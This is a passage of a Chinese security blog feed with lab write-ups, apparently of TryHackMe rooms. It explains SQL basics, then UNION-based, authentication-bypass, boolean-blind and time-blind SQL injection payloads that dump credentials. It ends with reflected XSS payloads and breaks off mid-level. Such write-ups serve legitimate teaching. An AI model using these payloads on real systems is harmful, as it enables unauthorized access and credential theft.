        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/73aeab67fb4786d5331bab4f3b2452827dba9d186069cdc60db0ecfab89b34c5.png" alt="Featured image of post SQL注入基础" /&gt;&lt;h1 id=&#34;sql注入&#34;&gt;SQL注入
&lt;/h1&gt;&lt;p&gt;SQL 语法不区分大小写。&lt;/p&gt;
&lt;h2 id=&#34;sql基础&#34;&gt;SQL基础
&lt;/h2&gt;&lt;h3 id=&#34;select&#34;&gt;SELECT
&lt;/h3&gt;&lt;p&gt;我们将学习的第一种查询类型是用于从数据库中检索数据的 SELECT 查询。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160026857.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;第一个单词 SELECT 告诉数据库我们想要检索一些数据;* 告诉数据库我们想从表中接收所有列。例如，该表可能包含三列（id、username 和 password）。“from users” 告诉数据库我们想要从名为 users 的表中检索数据。最后，末尾的分号告诉数据库这是查询的结束。&lt;/p&gt;
&lt;p&gt;下一个查询与上述查询类似，但这次，我们不是使用 * 返回数据库表中的所有列，而是只请求 username 和 password 字段。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select username,password from users;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160107670.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;与第一个查询一样，以下查询使用 * 选择器返回所有列，然后 “LIMIT 1” 子句强制数据库仅返回一行数据。将查询更改为 “LIMIT 1,1” 会强制查询跳过第一个结果，然后 “LIMIT 2,1” 会跳过前两个结果，依此类推。您需要记住，第一个数字告诉数据库您希望跳过多少个结果，第二个数字告诉数据库要返回多少行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users LIMIT 1;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160133299.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username=&#39;admin&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160158890.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这只会返回 username 等于 admin 的行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username != &#39;admin&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160228981.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这只会返回 username &lt;strong&gt;不&lt;/strong&gt; 等于 admin 的行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username=&#39;admin&#39; or username=&#39;jon&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160256822.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这只会返回用户名等于 admin 或 jon 的行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username=&#39;admin&#39; and password=&#39;p4ssword&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160336441.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这只会返回用户名等于 &lt;strong&gt;admin&lt;/strong&gt; 且密码等于 &lt;strong&gt;p4ssword&lt;/strong&gt; 的行.&lt;/p&gt;
&lt;h4 id=&#34;like&#34;&gt;like
&lt;/h4&gt;&lt;p&gt;使用 like 子句允许您指定不完全匹配，而是以特定字符开头、包含或结尾的数据，方法是选择放置由百分号表示的通配符的位置。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username like &#39;%n&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160440356.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这将返回用户名以字母 n 结尾的任何行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username like &#39;%mi%&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160504321.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这将返回用户名中包含字符 &lt;strong&gt;mi&lt;/strong&gt; 的任何行。&lt;/p&gt;
&lt;h3 id=&#34;union&#34;&gt;UNION
&lt;/h3&gt;&lt;p&gt;UNION 语句将两个或多个 SELECT 语句的结果组合在一起，以从单个或多个表中检索数据;此查询的规则是 UNION 语句必须在每个 SELECT 语句中检索相同数量的列，列必须具有相似的数据类型，并且列顺序必须相同。这听起来可能不是很清楚，所以让我们使用下面的类比。假设一家公司想要为所有客户和供应商创建一个地址列表，以便发布新目录。我们有一个名为 customers 的表，其中包含以下内容：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160608318.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;另一个表叫 suppliers，内容如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160630628.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;使用以下 SQL 语句，我们可以从两个表中收集结果并将它们放入一个结果集中：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160656676.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;insert&#34;&gt;INSERT
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;INSERT&lt;/strong&gt; 语句告诉数据库我们希望在表中插入一行新数据。 &lt;strong&gt;“into users”&lt;/strong&gt; 告诉数据库我们希望将数据插入到哪个表中， &lt;strong&gt;“（username，password）”&lt;/strong&gt; 提供我们提供数据的列，然后 &lt;strong&gt;“values （&amp;lsquo;bob&amp;rsquo;，&amp;lsquo;password&amp;rsquo;）”;&lt;/strong&gt; 提供以前指定的列的数据。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;insert into users (username,password) values (&#39;bob&#39;,&#39;password123&#39;);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160737067.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;update&#34;&gt;UPDATE
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;UPDATE&lt;/strong&gt; 语句告诉数据库我们希望更新表中的一行或多行数据。您使用 “&lt;strong&gt;update %tablename% SET&lt;/strong&gt;” 指定要更新的表，然后选择要更新的一个或多个字段，以逗号分隔的列表，例如 “&lt;strong&gt;username=&amp;lsquo;root&amp;rsquo;，password=&amp;lsquo;pass123&amp;rsquo;&lt;/strong&gt;”，最后，类似于 SELECT 语句，您可以使用 where 子句准确指定要更新的行，例如 “&lt;strong&gt;where username=&amp;lsquo;admin;&lt;/strong&gt;“&lt;/p&gt;
&lt;p&gt;&lt;code&gt;update users SET username=&#39;root&#39;,password=&#39;pass123&#39; where username=&#39;admin&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160817369.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;delete&#34;&gt;DELETE
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;DELETE&lt;/strong&gt; 语句告诉数据库我们希望删除一行或多行数据。除了缺少要返回的列之外，此查询的格式与 SELECT 非常相似。您可以使用 &lt;strong&gt;where&lt;/strong&gt; &lt;strong&gt;子句精确&lt;/strong&gt;指定要删除的数据，并使用 LIMIT 子句指定要删除的行 数。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;delete from users where username=&#39;martin&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160846187.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;delete from users;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;由于查询中未使用 WHERE 子句，因此所有数据都已从表中删除。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160925268.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;基础做题&#34;&gt;基础做题
&lt;/h2&gt;&lt;h3 id=&#34;in-band-sql-injection&#34;&gt;In-Band SQL Injection
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318163151079.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h4 id=&#34;查询库&#34;&gt;查询库
&lt;/h4&gt;&lt;p&gt;利用union查询的原理，先确定回显的位置。&lt;/p&gt;
&lt;p&gt;构建 &lt;code&gt;0 UNION SELECT 1,2,3&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;可以看到页面情况，有三个回显位置&lt;/p&gt;
&lt;p&gt;构建 &lt;code&gt;0 UNION SELECT 1,2,database()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318162957019.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;可以知道database的名字：sqli_one&lt;/p&gt;
&lt;h4 id=&#34;查询表&#34;&gt;查询表
&lt;/h4&gt;&lt;p&gt;构建 &lt;code&gt;0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = &#39;sqli_one&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在此查询中，需要学习一些新内容。首先，方法 &lt;strong&gt;group_concat（）&lt;/strong&gt; 从多个返回的行中获取指定的列（在我们的例子中为 table_name），并将其放入一个以逗号分隔的字符串中。接下来是 &lt;strong&gt;information_schema&lt;/strong&gt; 数据库;数据库的每个用户都可以访问它，它包含有关该用户有权访问的所有数据库和表的信息。在这个特定的查询中，我们有兴趣列出 sqli_one 数据库中的所有 表，即 article 和 staff_users。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318163513022.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;由于第一级旨在发现 Martin 的密码，因此 staff_users 表是我们感兴趣的。我们可以再次利用 information_schema 数据库，通过以下查询找到此表的结构。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = &#39;staff_users&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318163803767.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这与前面的 SQL 查询类似。但是，我们要检索的信息已从 table_name 更改为 &lt;strong&gt;column_name&lt;/strong&gt;，我们在 information_schema 数据库中查询的表已从 tables 更改为 &lt;strong&gt;columns&lt;/strong&gt;，并且我们正在搜索 table_name 列值为 staff_users 的任何行&lt;/p&gt;
&lt;p&gt;查询结果为 staff_users 表提供三列：id、password 和 username。我们可以使用以下查询的 username 和 password 列来检索用户的信息。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;0 UNION SELECT 1,2,group_concat(username,&#39;:&#39;,password SEPARATOR &#39;&amp;lt;br&amp;gt;&#39;) FROM staff_users&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;同样，我们使用 group_concat 方法将所有行返回到一个字符串中，使其 更易于阅读。我们还添加了 &lt;strong&gt;，&amp;rsquo;：&amp;rsquo;，&lt;/strong&gt; 以将用户名和密码彼此分开。我们没有用逗号分隔，而是选择了 &lt;code&gt;HTML &amp;lt;br&amp;gt;&lt;/code&gt; 标签，该标签强制每个结果位于单独的行上，以便于阅读。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318164023522.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;身份认证绕过盲注&#34;&gt;身份认证绕过盲注
&lt;/h3&gt;&lt;p&gt;与带内 SQL 注入不同，我们可以直接在屏幕上看到攻击的结果，而盲 SQLi 是指我们几乎没有收到反馈来确认我们注入的查询是否真的成功，这是因为错误消息已被禁用，但无论如何注入仍然有效。您可能会感到惊讶，我们只需要一点点反馈即可成功枚举整个数据库。&lt;/p&gt;
&lt;p&gt;最直接的盲 SQL 注入技术之一是绕过身份验证方法，例如登录表单。在这种情况下，我们对从数据库中检索数据并不那么感兴趣;我们只想通过登录。&lt;/p&gt;
&lt;p&gt;连接到用户数据库的登录表单的开发方式通常使 Web 应用程序对用户名和密码的内容不感兴趣，而更关心两者是否在 users 表中形成匹配的对。简单来说，Web 应用程序会询问数据库，“您有用户名为 bob 的用户，密码为 bob123 吗？ 数据库回答 Yes 或 No （true/false），并且根据该答案，指示 Web 应用程序是否允许您继续。&lt;/p&gt;
&lt;p&gt;考虑到上述信息，没有必要枚举有效的用户名/密码对。我们只需要创建一个以 yes/true 回复的数据库查询。&lt;/p&gt;
&lt;h4 id=&#34;实际&#34;&gt;实际：
&lt;/h4&gt;&lt;p&gt;SQL 注入示例的第二级显示了这个确切的示例。我们可以在标有 “SQL Query” 的框中看到，对数据库的查询如下：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username=&#39;%username%&#39; and password=&#39;%password%&#39; LIMIT 1;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;注意：%username% 和 %password% 值取自登录表单字段。SQL Query （SQL 查询） 框中的初始值将为空，因为这些字段当前为空。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;要将其转换为始终返回 true 的查询，我们可以在 password 字段中输入以下内容：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&#39; OR 1=1;--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这会将 SQL 查询转换为以下内容：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username=&#39;&#39; and password=&#39;&#39; OR 1=1;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;因为 1=1 是 true 语句，并且我们使用了 &lt;strong&gt;OR&lt;/strong&gt; 运算符，所以这将始终导致查询返回 true，这满足 Web 应用程序逻辑，即数据库找到了有效的用户名/密码组合，并且应该允许访问。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318164540872.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;基于布尔盲注&#34;&gt;基于布尔盲注
&lt;/h3&gt;&lt;p&gt;基于布尔值的 SQL 注入是指我们从注入尝试中收到的响应，可以是 true/false、yes/no、on/off、1/0 或任何只能有两个结果的响应。该结果确认了我们的 SQL Injection payload 成功或失败。在第一次检查时，您可能会觉得这种有限的回答无法提供太多信息。不过，仅通过这两个响应，就可以枚举整个数据库结构和内容。&lt;/p&gt;
&lt;h4 id=&#34;实际-1&#34;&gt;实际：
&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318164756211.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;览器正文包含 &lt;strong&gt;{“taken”：true}&lt;/strong&gt;。此 API 端点复制了许多订阅表单上的常见功能，该功能检查用户名是否已注册，以提示用户选择不同的用户名。 由于 &lt;strong&gt;taken&lt;/strong&gt; 的值设置为 &lt;strong&gt;true&lt;/strong&gt;，因此我们可以假设用户名 admin 已注册。我们可以通过将模拟浏览器地址栏中的用户名从 &lt;strong&gt;admin&lt;/strong&gt; 更改为 &lt;strong&gt;admin123&lt;/strong&gt; 来确认这一点，按下 Enter 键后，你会看到所采用的值 现在已更改为 false&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username = &#39;%username%&#39; LIMIT 1;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们唯一可以控制的输入是查询字符串中的用户名，我们必须使用它来执行 SQL 注入。将用户名保持为 &lt;strong&gt;admin123&lt;/strong&gt;，我们可以开始附加到此内容以尝试使数据库确认 true 内容，将 taken 字段的状态从 false 更改为 true。&lt;/p&gt;
&lt;p&gt;与前面的级别一样，我们的第一个任务是建立 users&amp;rsquo; 表中的列数，这可以通过使用 UNION 语句来实现。将 username 值更改为以下内容：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1;-- &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;由于 Web 应用程序已使用取为 false 的值 进行响应，因此我们可以确认这是不正确的列值。 继续添加更多列，直到我们得到 &lt;strong&gt;true&lt;/strong&gt; &lt;strong&gt;的 taken&lt;/strong&gt; 值 。您可以通过将 username 设置为以下值来确认答案为三列：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3;-- &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在我们已经确定了列数，我们可以进行数据库的枚举。我们的第一个任务是发现数据库名称。我们可以通过使用内置的 &lt;strong&gt;database（）&lt;/strong&gt; 方法，然后使用 &lt;strong&gt;like&lt;/strong&gt; 运算符来尝试查找将返回 true 状态的结果。&lt;/p&gt;
&lt;p&gt;尝试以下 username 值，看看会发生什么：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 where database() like &#39;%&#39;;--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们得到一个 true 响应，因为在 like 运算符中，我们只有 % 的值 ，它将匹配任何内容，因为它是通配符值。如果我们将通配符运算符更改为 **a%，**您将看到响应返回 false，这确认数据库名称不以字母 &lt;strong&gt;a&lt;/strong&gt; 开头。我们可以循环遍历所有字母、数字和字符，例如 - 和 _，直到找到匹配项。如果您将以下内容作为 username 值发送，您将收到一个 &lt;strong&gt;true&lt;/strong&gt; 响应，确认数据库名称以字母 &lt;strong&gt;s&lt;/strong&gt; 开头&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 where database() like &#39;s%&#39;;--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318165301765.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;现在，您继续 数据库名称的下一个字符，直到找到另一个真实的响应，例如，&amp;lsquo;sa%&amp;rsquo;、&amp;lsquo;sb%&amp;rsquo;、&amp;lsquo;sc%&amp;rsquo; 等。继续此过程，直到发现数据库名称的所有字符，即 &lt;strong&gt;sqli_three&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318165348478.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;我们已经建立了数据库名称，现在我们可以通过使用 information_schema 数据库使用类似的方法使用它来枚举表名。尝试将 username 设置为以下值：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = &#39;sqli_three&#39; and table_name like &#39;a%&#39;;--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;此查询在 &lt;strong&gt;tables&lt;/strong&gt; 表中的 information_schema 数据库中 查找数据库名称与 sqli_three 匹配 且表名称以字母 a 开头的结果。 由于上述查询导致 &lt;strong&gt;false&lt;/strong&gt; 响应，我们可以确认 sqli_three 数据库中没有以字母 a 开头的表。和以前一样，您需要在字母、数字和字符之间循环，直到找到正匹配项。&lt;/p&gt;
&lt;p&gt;您最终会在 sqli_three 数据库中发现一个名为 users 的表，您可以通过运行以下 username payload 来确认该表：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = &#39;sqli_three&#39; and table_name=&#39;users&#39;;--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;最后，我们现在需要枚举 users 表中的列名 ，以便我们可以正确地搜索登录凭据。 同样，我们可以使用 information_schema 数据库和我们已经获得的信息来查询它的列名。使用下面的有效负载，我们搜索 columns 表，其中 database 等于 sqli_three，表名称为 users，列名称以字母 a 开头。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=&#39;sqli_three&#39; and TABLE_NAME=&#39;users&#39; and COLUMN_NAME like &#39;a%&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;同样， 您需要在字母、数字和字符之间循环，直到找到匹配项。由于您要查找多个结果，因此每次找到新的列名称时，都必须将其添加到有效负载中，以避免发现相同的结果。例如，找到名为 id 的列后，将其附加到原始有效负载中（如下所示）。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=&#39;sqli_three&#39; and TABLE_NAME=&#39;users&#39; and COLUMN_NAME like &#39;a%&#39; and COLUMN_NAME !=&#39;id&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;重复此过程 3 次，您将发现列的 ID、用户名和密码。现在，您可以使用它来查询 &lt;strong&gt;users&lt;/strong&gt; 表以获取登录凭据。首先，您需要找到一个有效的用户名，您可以使用下面的有效负载：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 from users where username like &#39;a%&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 from users where username=&#39;admin&#39; and password like &#39;a%&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;基于时间的盲注&#34;&gt;基于时间的盲注
&lt;/h3&gt;&lt;p&gt;基于时间的盲目 SQL 注入与上述基于 布尔值的盲注非常相似，因为发送的请求相同，但这次没有明显的查询是错还是对的指示。相反，正确查询的指标基于查询完成所需的时间。此时间延迟是使用内置方法（如 &lt;strong&gt;SLEEP（x）&lt;/strong&gt; 和 UNION 语句引入的。SLEEP（） 方法只会在成功的 UNION SELECT 语句后执行。&lt;/p&gt;
&lt;h4 id=&#34;实际-2&#34;&gt;实际：
&lt;/h4&gt;&lt;p&gt;因此，例如，在尝试建立表中的列数时，您将使用以下查询：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT SLEEP(5);--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果响应时间没有暂停，则我们知道查询不成功，因此与之前的任务一样，我们添加另一列：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT SLEEP(5),2;--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;有效负载应产生 5 秒的延迟，确认 UNION 语句成功执行，并且有两列。&lt;/p&gt;
&lt;p&gt;按照布尔盲注的步骤，只是更改一下前面的语句，要改成sleep()形式&lt;/p&gt;
&lt;p&gt;最后得到admin：4961&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318171316143.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>关于XSS基础的利用</title>
        <link>https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/</link>
        <pubDate>Tue, 18 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/b700481cd7430f01667bb498798f40d218f0b35bb085b3ffa989e042ad5542a1.png" alt="Featured image of post 关于XSS基础的利用" /&gt;&lt;h1 id=&#34;xss-thm-做题记录&#34;&gt;XSS THM 做题记录
&lt;/h1&gt;&lt;h2 id=&#34;level-one&#34;&gt;Level One:
&lt;/h2&gt;&lt;p&gt;看到一个表单，要您输入的姓名，输入姓名后，该表单将在下面的一行中显示，例如：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318144957610.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;如果查看 Page Source，将看到姓名反映在代码中：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/f371398ba148e07e85b946028e7f6919.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;我们将尝试输入以下 JavaScript Payload，而不是输入姓名： &lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;THM&#39;);&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;现在，当单击输入按钮时，将收到一个带有字符串 &lt;strong&gt;THM&lt;/strong&gt; 的警报弹出窗口，页面源代码将如下所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145139853.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;level-two&#34;&gt;Level Two：
&lt;/h2&gt;&lt;p&gt;与上一个级别一样，系统将再次要求您输入的姓名。这一次，当单击 enter 时，姓名将反映在 input 标签中：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145218406.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;查看页面源，可以看到姓名反映在 input 标签的 value 属性中：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145236972.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;如果要尝试前面的 JavaScript 有效负载，它将不起作用，因为无法从 input 标签内部运行它。相反，我们需要先转义 input 标签，以便 payload 可以正常运行。可以使用以下有效负载执行此作：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&#39;THM&#39;);&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;有效负载的重要部分是&lt;code&gt;“&amp;gt;&lt;/code&gt;”，它关闭 value 参数，然后关闭 input 标记。&lt;/p&gt;
&lt;p&gt;现在，这会正确关闭 input 标记并允许 JavaScript 有效负载运行：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145309755.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;level-three&#34;&gt;Level Three:
&lt;/h2&gt;&lt;p&gt;看到另一个表单，询问名字，与上一级一样，名字会反映在 HTML 标签中，这次是 textarea 标签。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145339066.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;我们必须使用以下有效负载，以略微不同的方式转义 textarea 标签和输入 1（在 Level Two 中）：&lt;/p&gt;
